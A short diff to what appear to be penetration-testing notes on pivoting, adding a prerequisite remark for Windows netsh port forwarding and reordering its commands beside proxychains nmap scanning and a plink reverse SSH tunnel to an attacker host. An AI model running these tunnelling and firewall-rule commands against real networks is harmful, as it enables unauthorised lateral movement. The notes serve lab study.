@@ -35,7 +35,8 @@ sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110(another internal netw
 cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234(dst):127.0.0.1:3306(source) 10.11.0.4
 ```
 ###### Netsh
+>for this to work, the Windows system must have the IP Helper service running and IPv6 support must be enabled for the interface we want to use
 ```
-netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
 netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
+netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
 ```
